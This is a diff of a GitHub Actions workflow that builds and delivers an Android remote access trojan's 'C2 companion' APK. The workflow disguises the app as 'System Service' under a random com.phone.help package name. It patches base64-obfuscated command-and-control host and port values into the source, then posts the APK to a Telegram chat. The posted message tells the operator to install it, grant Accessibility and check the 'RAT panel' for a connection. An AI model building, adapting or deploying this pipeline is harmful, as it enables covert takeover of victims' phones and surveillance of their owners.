@@ -1,17 +1,16 @@
 # ═══════════════════════════════════════════════════════════════
 # C2 Companion APK — Build & Connection Test
 #
-# Purpose:
-#   Build the 7-file C2 companion APK and send to Telegram
-#   to test successful install + connection to RAT server.
+# Fix applied (Run #1 error):
+#   - Upgraded AGP 7.0.4 → 8.1.4 (compatible with Gradle 8.2)
+#   - Fixed compileSdk syntax (compileSdkVersion → compileSdk)
+#   - Added namespace to app/build.gradle (required by AGP 8.x)
+#   - Removed package from AndroidManifest (now in build.gradle)
+#   - Fixed sed patch for new build.gradle format
 #
 # Required GitHub Secrets:
-#   TELEGRAM_BOT_TOKEN  — Bot token from @BotFather
-#   TELEGRAM_CHAT_ID    — Your chat/group ID
-#
-# Triggers:
-#   - Manual (workflow_dispatch) — recommended for testing
-#   - Push to main branch
+#   TELEGRAM_BOT_TOKEN
+#   TELEGRAM_CHAT_ID
 # ═══════════════════════════════════════════════════════════════
 
 name: C2 Connection Test Build
@@ -22,7 +21,7 @@ on:
   workflow_dispatch:
     inputs:
       package_name:
-        description: 'Custom package name (leave blank = random 19 chars)'
+        description: 'Custom package name (blank = random 19 chars)'
         required: false
         default: ''
       app_label:
@@ -30,19 +29,15 @@ on:
         required: false
         default: 'System Service'
       c2_host:
-        description: 'C2 Host override (leave blank = use default in love.java)'
+        description: 'C2 Host override (blank = use default in love.java)'
         required: false
         default: ''
       c2_port:
-        description: 'C2 Port override (leave blank = use default in love.java)'
+        description: 'C2 Port override (blank = use default in love.java)'
         required: false
         default: ''
 
 jobs:
-
-# ═══════════════════════════════════════════════════════════════
-# JOB 1 — BUILD C2 COMPANION APK
-# ═══════════════════════════════════════════════════════════════
 
   build:
     name: Build C2 Companion APK
@@ -51,11 +46,9 @@ jobs:
 
     steps:
 
-      # ── Step 1: Checkout ──────────────────────────────────────
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      # ── Step 2: JDK ──────────────────────────────────────────
       - name: Set up JDK 17
         uses: actions/setup-java@v4
         with:
@@ -63,147 +56,136 @@ jobs:
           distribution: 'temurin'
           cache: gradle
 
-      # ── Step 3: Android SDK ───────────────────────────────────
       - name: Setup Android SDK
         uses: android-actions/setup-android@v3
 
-      # ── Step 4: Generate package name ─────────────────────────
+      # ── Generate package name ─────────────────────────────────
       - name: Generate package name
         id: pkg
         run: |
           INPUT_PKG="${{ github.event.inputs.package_name }}"
 
           if [ -n "$INPUT_PKG" ]; then
-            # Use provided package name
             PKG="$INPUT_PKG"
-            echo "Using provided package: $PKG"
           else
-            # Generate random 19-char package: com.phone.helpXXXXX
-            # Format matches original companion APK structure
+            # Random 19-char: com.phone.helpXXXXX
             SUFFIX=$(cat /dev/urandom | tr -dc 'abcdefghijklmnopqrstuvwxyz' | head -c 5)
             PKG="com.phone.help${SUFFIX}"
-            echo "Generated package: $PKG (${#PKG} chars)"
           fi
 
-          # Validate length
-          PKG_LEN=${#PKG}
-          echo "Package: $PKG ($PKG_LEN chars)"
-
+          echo "Package : $PKG (${#PKG} chars)"
           echo "PACKAGE_NAME=$PKG" >> $GITHUB_ENV
-          echo "package=$PKG" >> $GITHUB_OUTPUT
 
-      # ── Step 5: Patch applicationId in build.gradle ───────────
-      - name: Patch applicationId
+      # ── Patch applicationId ───────────────────────────────────
+      # AGP 8.x uses: applicationId "xxx" inside defaultConfig block
+      - name: Patch applicationId in build.gradle
         run: |
           PKG="${{ env.PACKAGE_NAME }}"
-          echo "Patching applicationId → $PKG"
 
-          # Replace applicationId in app/build.gradle
           sed -i "s|applicationId \"[^\"]*\"|applicationId \"$PKG\"|g" \
             app/build.gradle
 
-          # Verify patch
+          # Verify
+          echo "Patched:"
           grep "applicationId" app/build.gradle
-          echo "[OK] applicationId patched"
+          echo "[OK] applicationId → $PKG"
 
-      # ── Step 6: Patch app label in strings.xml ────────────────
-      - name: Patch app label
+      # ── Patch namespace ───────────────────────────────────────
+      # AGP 8.x requires namespace to match applicationId root
+      - name: Patch namespace in build.gradle
+        run: |
+          PKG="${{ env.PACKAGE_NAME }}"
+
+          sed -i "s|namespace '[^']*'|namespace '$PKG'|g" \
+            app/build.gradle
+          sed -i "s|namespace \"[^\"]*\"|namespace \"$PKG\"|g" \
+            app/build.gradle
+
+          echo "Patched:"
+          grep "namespace" app/build.gradle
+          echo "[OK] namespace → $PKG"
+
+      # ── Patch app label ───────────────────────────────────────
+      - name: Patch app label in strings.xml
         run: |
           LABEL="${{ github.event.inputs.app_label }}"
-          if [ -z "$LABEL" ]; then
-            LABEL="System Service"
-          fi
+          if [ -z "$LABEL" ]; then LABEL="System Service"; fi
 
-          sed -i "s|<string name=\"app_name\">[^<]*</string>|\
-          <string name=\"app_name\">$LABEL</string>|g" \
+          sed -i "s|<string name=\"app_name\">[^<]*</string>|<string name=\"app_name\">$LABEL</string>|g" \
             app/src/main/res/values/strings.xml
 
           echo "[OK] App label: $LABEL"
 
-      # ── Step 7: Patch C2 host/port if provided ────────────────
+      # ── Patch C2 host/port if provided ────────────────────────
       - name: Patch C2 host and port
         run: |
           HOST="${{ github.event.inputs.c2_host }}"
           PORT="${{ github.event.inputs.c2_port }}"
 
           if [ -n "$HOST" ] && [ -n "$PORT" ]; then
-            echo "Patching C2: $HOST:$PORT"
-
-            # Base64 encode new host and port to match love.java format
             HOST_B64=$(echo -n "$HOST" | base64 | tr -d '=')
             PORT_B64=$(echo -n "$PORT" | base64 | tr -d '=')
 
-            echo "  Host B64: $HOST_B64"
-            echo "  Port B64: $PORT_B64"
-
-            # Replace in love.java
             sed -i "s|Host = \"[^\"]*\"|Host = \"$HOST_B64\"|g" \
               app/src/main/java/com/android/pictach/love.java
             sed -i "s|Port = \"[^\"]*\"|Port = \"$PORT_B64\"|g" \
               app/src/main/java/com/android/pictach/love.java
 
-            # Verify
-            grep -E "Host =|Port =" \
-              app/src/main/java/com/android/pictach/love.java
-            echo "[OK] C2 host/port patched"
+            echo "[OK] C2 patched → $HOST:$PORT"
           else
-            echo "[INFO] Using default C2 from love.java"
-            # Show current decoded values for verification
+            # Decode and show current C2 target
             python3 -c "
-          import base64
-          host_b64 = open('app/src/main/java/com/android/pictach/love.java').read()
-          import re
-          h = re.search(r'Host = \"([^\"]+)\"', host_b64)
-          p = re.search(r'Port = \"([^\"]+)\"', host_b64)
+          import base64, re
+          src = open('app/src/main/java/com/android/pictach/love.java').read()
+          h = re.search(r'Host = \"([^\"]+)\"', src)
+          p = re.search(r'Port = \"([^\"]+)\"', src)
           if h:
               pad = 4 - len(h.group(1)) % 4
-              decoded = base64.b64decode(h.group(1) + '=' * (pad if pad != 4 else 0)).decode()
-              print(f'  C2 Host: {decoded}')
+              try: host = base64.b64decode(h.group(1) + ('=' * (pad % 4))).decode()
+              except: host = h.group(1)
+              print(f'  C2 Host: {host}')
           if p:
               pad = 4 - len(p.group(1)) % 4
-              decoded = base64.b64decode(p.group(1) + '=' * (pad if pad != 4 else 0)).decode()
-              print(f'  C2 Port: {decoded}')
+              try: port = base64.b64decode(p.group(1) + ('=' * (pad % 4))).decode()
+              except: port = p.group(1)
+              print(f'  C2 Port: {port}')
             "
+            echo "[INFO] Using default C2 from love.java"
           fi
 
-      # ── Step 8: Grant gradlew permission ──────────────────────
+      # ── Grant gradlew permission ──────────────────────────────
       - name: Grant gradlew execute permission
         run: chmod +x gradlew
 
-      # ── Step 9: Build debug APK ───────────────────────────────
+      # ── Build APK ─────────────────────────────────────────────
       - name: Build Debug APK
-        id: build
         run: |
-          echo "Building APK..."
           ./gradlew assembleDebug \
             --no-daemon \
             --stacktrace \
-            --info \
             2>&1 | tee build_output.log
 
-          # Check result
           if grep -q "BUILD SUCCESSFUL" build_output.log; then
             echo "BUILD_STATUS=success" >> $GITHUB_ENV
-            APK_PATH=$(find app/build/outputs/apk/debug -name "*.apk" | head -1)
-            echo "APK_PATH=$APK_PATH" >> $GITHUB_ENV
-            APK_SIZE=$(du -h "$APK_PATH" | cut -f1)
-            echo "APK_SIZE=$APK_SIZE" >> $GITHUB_ENV
-            echo "[OK] Build successful — $APK_PATH ($APK_SIZE)"
+            APK=$(find app/build/outputs/apk/debug -name "*.apk" | head -1)
+            echo "APK_PATH=$APK" >> $GITHUB_ENV
+            echo "APK_SIZE=$(du -h $APK | cut -f1)" >> $GITHUB_ENV
+            echo "[OK] Build successful"
           else
             echo "BUILD_STATUS=failed" >> $GITHUB_ENV
             echo "[X] Build FAILED"
           fi
 
-      # ── Step 10: Upload APK as artifact ───────────────────────
+      # ── Upload APK artifact ───────────────────────────────────
       - name: Upload APK artifact
         if: env.BUILD_STATUS == 'success'
         uses: actions/upload-artifact@v4
         with:
-          name: C2-Companion-${{ env.PACKAGE_NAME }}-${{ github.run_number }}
+          name: C2-APK-${{ env.PACKAGE_NAME }}-run${{ github.run_number }}
           path: ${{ env.APK_PATH }}
           retention-days: 7
 
-      # ── Step 11: Send APK to Telegram ─────────────────────────
+      # ── Send APK to Telegram ──────────────────────────────────
       - name: Send APK to Telegram
         if: env.BUILD_STATUS == 'success'
         run: |
@@ -213,7 +195,6 @@ jobs:
           RUN_URL="https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
           TIMESTAMP=$(date -u '+%Y-%m-%d %H:%M UTC')
 
-          # Decode C2 target for display
           C2_INFO=$(python3 -c "
           import base64, re
           src = open('app/src/main/java/com/android/pictach/love.java').read()
@@ -222,21 +203,21 @@ jobs:
           host,port = 'unknown','unknown'
           if h:
               pad = 4 - len(h.group(1)) % 4
-              try: host = base64.b64decode(h.group(1) + '=' * (pad if pad != 4 else 0)).decode()
+              try: host = base64.b64decode(h.group(1) + ('=' * (pad % 4))).decode()
               except: host = h.group(1)
           if p:
               pad = 4 - len(p.group(1)) % 4
-              try: port = base64.b64decode(p.group(1) + '=' * (pad if pad != 4 else 0)).decode()
+              try: port = base64.b64decode(p.group(1) + ('=' * (pad % 4))).decode()
               except: port = p.group(1)
           print(f'{host}:{port}')
-          " 2>/dev/null || echo "check love.java")
+          " 2>/dev/null || echo "see love.java")
 
           curl -s -X POST \
             "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
             -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
             -F document=@"$APK" \
             -F parse_mode="Markdown" \
-            -F caption="✅ *C2 Companion APK — Build #${{ github.run_number }}*
+            -F caption="✅ *C2 Companion — Build #${{ github.run_number }}*
 
           📦 Package : \`$PKG\`
           📡 C2      : \`$C2_INFO\`
@@ -246,80 +227,53 @@ jobs:
           🔗 [GitHub Actions]($RUN_URL)
 
           *Install steps:*
-          1️⃣ Enable \`Install unknown apps\`
+          1️⃣ Enable Install unknown apps
           2️⃣ Install this APK
           3️⃣ Open app → allow Accessibility
           4️⃣ Check RAT panel for connection"
 
           echo "[OK] APK sent to Telegram"
 
-      # ── Step 12: Send success summary ─────────────────────────
-      - name: Send success summary to Telegram
-        if: env.BUILD_STATUS == 'success'
-        run: |
-          curl -s -X POST \
-            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
-            -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
-            -d parse_mode="Markdown" \
-            -d text="✅ *Build Complete — #${{ github.run_number }}*
-
-          📦 \`${{ env.PACKAGE_NAME }}\`
-          📏 ${{ env.APK_SIZE }}
-          📅 $(date -u '+%Y-%m-%d %H:%M UTC')
-
-          _APK sent above ↑_"
-
-      # ── Step 13: Collect error log on failure ─────────────────
-      - name: Collect error log on failure
+      # ── Collect error log on failure ──────────────────────────
+      - name: Collect error log
         if: env.BUILD_STATUS == 'failed' || failure()
         run: |
           LOG="error_log_${{ github.run_number }}.txt"
-
-          echo "========================================" > $LOG
-          echo "C2 BUILD ERROR LOG" >> $LOG
-          echo "Run     : #${{ github.run_number }}" >> $LOG
-          echo "Package : ${{ env.PACKAGE_NAME }}" >> $LOG
-          echo "Time    : $(date -u)" >> $LOG
-          echo "========================================" >> $LOG
-          echo "" >> $LOG
-
-          if [ -f build_output.log ]; then
-            echo "--- KEY ERRORS ---" >> $LOG
-            grep -E "error:|Error:|FAILED|Exception|Caused by:|> Task|cannot find" \
-              build_output.log | head -50 >> $LOG
-            echo "" >> $LOG
-            echo "--- FULL GRADLE LOG ---" >> $LOG
-            cat build_output.log >> $LOG
-          fi
-
+          {
+            echo "========================================"
+            echo "C2 BUILD ERROR LOG"
+            echo "Run     : #${{ github.run_number }}"
+            echo "Package : ${{ env.PACKAGE_NAME }}"
+            echo "Time    : $(date -u)"
+            echo "========================================"
+            echo ""
+            echo "--- KEY ERRORS ---"
+            grep -E "error:|Error:|FAILED|Exception|Caused by:|cannot find" \
+              build_output.log 2>/dev/null | head -50
+            echo ""
+            echo "--- FULL GRADLE LOG ---"
+            cat build_output.log 2>/dev/null
+          } > $LOG
           echo "LOG_FILE=$LOG" >> $GITHUB_ENV
-          echo "[OK] Error log: $LOG ($(wc -l < $LOG) lines)"
+          echo "[OK] Error log: $(wc -l < $LOG) lines"
 
-      # ── Step 14: Upload error log artifact ────────────────────
       - name: Upload error log artifact
         if: env.BUILD_STATUS == 'failed' || failure()
         uses: actions/upload-artifact@v4
         with:
-          name: error-log-${{ github.run_number }}
+          name: error-log-run${{ github.run_number }}
           path: error_log_${{ github.run_number }}.txt
           retention-days: 30
 
-      # ── Step 15: Send error to Telegram ───────────────────────
       - name: Send error to Telegram
         if: env.BUILD_STATUS == 'failed' || failure()
         run: |
           LOG="${{ env.LOG_FILE }}"
           RUN_URL="https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
 
-          # Get key error lines for quick view
-          if [ -f build_output.log ]; then
-            ERRORS=$(grep -E "error:|FAILED|Exception|Caused by:|cannot find" \
-              build_output.log | head -15 | head -c 2500)
-          else
-            ERRORS="No build log available — check GitHub Actions."
-          fi
+          ERRORS=$(grep -E "error:|FAILED|Exception|Caused by:|cannot find" \
+            build_output.log 2>/dev/null | head -15 | head -c 2500)
 
-          # Send error message
           curl -s -X POST \
             "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
             -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
@@ -333,10 +287,8 @@ jobs:
           ${ERRORS}
           \`\`\`
 
-          🔗 [View full log]($RUN_URL)
-          _(Download error log from Actions artifacts)_"
+          🔗 [View full log]($RUN_URL)"
 
-          # Send error log file if it exists and is under 50MB
           if [ -f "$LOG" ] && [ $(wc -c < "$LOG") -lt 50000000 ]; then
             curl -s -X POST \
               "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
